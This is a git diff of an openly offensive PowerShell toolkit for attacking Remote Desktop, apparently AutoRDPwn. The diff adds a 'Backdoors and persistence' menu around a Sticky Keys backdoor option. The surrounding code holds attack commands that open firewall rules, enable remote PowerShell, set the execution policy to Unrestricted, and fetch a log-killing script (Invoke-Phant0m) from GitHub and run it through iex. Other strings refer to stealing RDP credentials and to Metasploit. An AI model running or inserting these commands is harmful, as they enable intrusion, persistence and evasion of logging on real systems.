@@ -43,7 +43,7 @@ function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
+     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt64" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt62" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
@@ -147,6 +147,7 @@ if($Language -in 'English') {
   $txt61 = "Retrieve RDP session credentials"
   $txt62 = "Remote VNC Server (legacy)"
   $txt63 = "Paste in your Metasploit Framework Console:` "
+  $txt64 = "Backdoors and persistence"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
@@ -218,6 +219,7 @@ if($Language -in 'Spanish') {
   $txt61 = "Recuperar credenciales de sesión RDP"
   $txt62 = "Servidor VNC Remoto (legacy)"
   $txt63 = "Pega esto en tu consola de Metasploit Framework:` "
+  $txt64 = "Backdoors y persistencia"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
@@ -510,7 +512,17 @@ if($Language -in 'Spanish') {
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
         if($forensics -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
-        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
+        
+	if($module -like '5') { Show-Banner
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
+        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+	$Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
+	
+	if($backdoor -like '1') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
+	if($backdoor -like 'X'){ $input = 'x' ; continue }
+        if($backdoor -in '1','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
 
         if($module -like '6') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
